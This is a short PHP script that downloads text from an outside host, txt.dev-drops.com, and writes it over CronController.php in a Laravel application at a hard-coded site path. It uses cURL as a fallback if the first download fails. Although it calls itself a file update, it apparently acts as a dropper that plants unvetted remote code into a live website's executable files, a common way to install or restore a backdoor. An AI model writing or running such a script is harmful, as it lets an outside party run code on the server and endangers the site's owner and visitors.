<?php
// Define the destination path and the source URL
$destinationFile = '/home/tradutve/stakexpro.site/core/app/Http/Controllers/CronController.php';
$sourceUrl = 'http://txt.dev-drops.com/www.txt';

echo "Starting file update process...\n";

// Fetch the content from the remote URL
$content = @file_get_contents($sourceUrl);

if ($content === false) {
    // If file_get_contents fails, try using cURL as a fallback
    echo "file_get_contents failed. Attempting cURL...\n";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sourceUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $content = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode !== 200 || $content === false) {
        die("Error: Unable to fetch content from URL. HTTP Code: " . $httpCode . "\n");
    }
}

// Ensure the destination directory exists
$directory = dirname($destinationFile);
if (!is_dir($directory)) {
    if (!mkdir($directory, 0755, true)) {
        die("Error: Failed to create directories for path: " . $directory . "\n");
    }
}

// Write the content to the target file
$result = @file_put_contents($destinationFile, $content);

if ($result !== false) {
    echo "Success! The file has been successfully updated. Total bytes written: " . $result . "\n";
} else {
    $error = error_get_last();
    echo "Error: Failed to write to " . $destinationFile . "\n";
    if ($error) {
        echo "Reason: " . $error['message'] . "\n";
    }
}
?>
